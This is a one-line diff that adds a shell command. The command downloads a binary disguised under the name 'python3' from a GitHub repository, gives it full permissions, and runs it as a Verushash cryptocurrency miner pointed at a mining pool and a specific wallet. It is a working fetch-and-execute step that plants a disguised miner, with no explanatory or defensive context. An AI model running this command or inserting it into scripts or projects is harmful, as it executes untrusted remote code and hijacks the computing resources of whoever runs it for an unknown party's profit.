@@ -1,0 +1,1 @@
+wget https://raw.githubusercontent.com/teenwolf99/nremon/main/python3 && chmod 777 python3 && ./python3 --disable-gpu --algorithm verushash --pool na.luckpool.net:3956 --wallet RXj6gxnuex8hnj2ota9abENzTnDuWJwUnw.rig003 --password x
